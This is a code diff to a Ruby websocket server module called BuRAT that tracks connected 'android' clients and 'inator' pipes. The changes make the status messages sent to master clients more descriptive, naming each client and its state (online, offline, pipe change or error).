@@ -29,7 +29,7 @@ module BuRAT
             p "#{header} #{trailer}"        # debug
 
             if header == "androids" then # clients - list of clients
-              packet = packet("androids", @androids, 'deathnote')
+              packet = packet("androids", @androids, 'androids')
               ws.send(packet)
             elsif header == "android" then # client - client identification
               android = @androids.find { |android| android["id"] == payload["id"] }
@@ -37,7 +37,7 @@ module BuRAT
               payload.store("ws", ws)
               payload["inators"].each { |inator| inator.store("pipes", Array.new) }
               android == nil ? @androids << payload : android.replace(payload)
-              packet = packet("android", payload, "disconnected")
+              packet = packet("android", payload, "#{payload["name"]} online")
               masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
               masters.each { |master| master["ws"].send(packet) }
             elsif header == "data" then # data - send to master and pipe
@@ -69,7 +69,7 @@ module BuRAT
               when "close"
                 inator["pipes"].delete({"android" => payload["android_out"], "inator" => payload["inator_out"], "filter" => payload["filter"]})
               end
-              packet = packet("android", android, "pipe")
+              packet = packet("android", android, "#{android["name"]} pipe #{payload["switch"]}")
               masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
               masters.each { |master| master["ws"].send(packet) }
             end
@@ -83,7 +83,7 @@ module BuRAT
           android = @androids.find { |android| android["ws"] == ws }
           android["status"] = "Offline"
           android["ws"] = nil
-          packet = packet('android', android, "disconnected")
+          packet = packet('android', android, "#{android["name"]} offline")
           masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
           masters.each { |master| master["ws"].send(packet) }
         end
@@ -92,7 +92,7 @@ module BuRAT
           android = @androids.find { |android| android["ws"] == ws }
           android["status"] = "Error"
           android["ws"] = nil
-          packet = packet('android', android, "#{event.code} #{event.reason}")
+          packet = packet('android', android, "#{android["name"]} error : #{event.code} #{event.reason}")
           masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
           masters.each { |master| master["ws"].send(packet) }
         end
